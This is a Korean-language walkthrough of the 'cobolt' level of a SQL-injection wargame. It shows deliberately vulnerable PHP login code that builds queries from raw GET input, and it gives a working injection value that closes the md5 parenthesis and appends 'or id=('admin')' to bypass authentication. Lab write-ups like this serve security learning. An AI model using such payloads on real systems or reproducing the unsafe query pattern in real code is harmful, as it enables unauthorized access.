# cobolt

## 1. Code
```php
<?php
  include "./config.php"; 
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_cobolt where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("cobolt");
  elseif($result['id']) echo "<h2>Hello {$result['id']}<br>You are not admin :(</h2>"; 
  highlight_file(__FILE__); 
?>
```

## 2. Condition
- GET 방식으로 id와 pw를 받는다.
- 받아온 pw를 md5함수에 넣어 비교한다.
- select된 id가 'admin'이어야 한다.

## 3. Solution
변수명 | 값
---|---:
`id` | 1234
`pw` | 1234') or id=('admin


GET으로 받아온 pw값을 쿼리 안에서 괄호로 감싼다.<br>
&rarr; 동일하게 괄호를 닫아주고 문장을 자연스럽게 연결해주면 된다.


해당 값을 보내면, query 속 조건은 다음과 같다.


**select id from prob_cobolt where id='1234' and pw=md5('1234') or id=('admin')**


`or`을 기준으로 왼쪽 `id='1234' and pw=md5('1234')`이 거짓, 오른쪽 `id=('admin')`이 참이므로<br>
참인 조건에 의거 'admin'을 불러오게 된다.